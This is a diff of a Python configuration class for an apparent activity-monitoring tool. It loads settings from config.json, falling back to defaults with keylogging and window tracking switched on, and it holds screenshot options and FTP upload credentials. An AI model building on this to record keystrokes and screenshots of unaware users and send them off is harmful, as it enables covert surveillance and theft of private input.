@@ -6,6 +6,7 @@ from Util import Util
 
 class Configuration:
 
+
     def __init__(self):
         #ABSOLUTE FILE PATHS AND USER DATA
             self.__userName = getpass.getuser()
@@ -29,13 +30,33 @@ class Configuration:
             self.__ftpURL = None
             self.__ftpUserName = None
             self.__ftpPassword = None
-            #try:
-            print(type(Util.jsonIn(self.__logPath + 'config.json')))
-            #except Exception:
-            #    print('read error')
+
+            try:
+                config = Util.jsonIn(self.__logPath + 'config.json')
+                self.__setConfig(config)
+                print('Config.json loaded!')
+            except Exception:
+                self.__setDefault()
+                pass
 
 
-    def setDefault(self):
+
+    def __setConfig(self, config:dict):
+            self.__debug = config['debug']
+            self.__keyloggingIsActive = config['keyloggingIsActive'.lower()]
+            self.__windowTrackingIsActive = config['windowTrackingIsActive'.lower()]
+            self.__samplingFrequency = config['samplingFrequency'.lower()]
+            self.__screenshotFrequency = config['screenshotFrequency'.lower()]
+            self.__screenshotTrigger = config['screenshotTrigger'.lower()]
+            self.__baseURL = config['baseURL'.lower()]
+            self.__communicationFrequency = config['communicationFrequency'.lower()]
+            self.__ftpURL = config['ftpURL'.lower()]
+            self.__ftpUserName = config['ftpUserName'.lower()]
+            self.__ftpPassword = config['ftpPassword'.lower()]
+
+
+
+    def __setDefault(self):
             self.__debug = True
             self.__keyloggingIsActive = True
             self.__windowTrackingIsActive = True
@@ -47,6 +68,7 @@ class Configuration:
             self.__ftpURL = None
             self.__ftpUserName = None
             self.__ftpPassword = None
+
 
 
     @property
@@ -112,6 +134,10 @@ class Configuration:
     @property
     def userName(self):
         return self.__userName
+
+
+
+
 
 
 
